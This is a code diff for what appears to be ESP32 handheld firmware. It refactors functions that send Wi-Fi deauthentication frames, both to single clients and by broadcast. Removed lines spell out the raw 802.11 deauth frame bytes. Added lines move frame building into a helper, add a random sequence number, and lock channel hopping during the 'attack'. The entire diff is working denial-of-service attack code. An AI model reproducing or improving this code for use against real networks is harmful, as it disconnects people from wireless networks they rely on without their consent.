@@ -16,6 +16,7 @@
 #include "ui.h"
 #include "input.h"
 #include "radio.h"
+#include "wifi_deauth_frame.h"
 #include "ble_db.h"
 #include "dhcp_cache.h"
 #include <WiFi.h>
@@ -103,38 +104,34 @@ static void hop_task(void *)
     vTaskDelete(nullptr);
 }
 
+static uint16_t s_hot_seq = 0;
+
 static void unicast_deauth(const uint8_t *sta, const uint8_t *bssid, uint8_t ch, int bursts)
 {
-    uint8_t frame[26] = {
-        0xC0, 0x00, 0x00, 0x00,
-        sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
-        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-        0x00, 0x00,
-        0x07, 0x00,
-    };
+    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
+    /* Block the hopper for the duration of the burst so the channel
+     * doesn't shift mid-attack. */
+    bool prev_lock = s_locked;
+    s_locked = true;
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < bursts; ++i) {
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+        wifi_deauth_pair(sta, bssid, &s_hot_seq);
         delay(5);
     }
+    s_locked = prev_lock;
 }
 
 static void broadcast_deauth(const uint8_t *bssid, uint8_t ch, int bursts)
 {
-    uint8_t frame[26] = {
-        0xC0, 0x00, 0x00, 0x00,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-        0x00, 0x00,
-        0x07, 0x00,
-    };
+    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
+    bool prev_lock = s_locked;
+    s_locked = true;
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < bursts; ++i) {
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+        wifi_deauth_broadcast(bssid, &s_hot_seq);
         delay(5);
     }
+    s_locked = prev_lock;
 }
 
 void feat_wifi_clients_all(void)
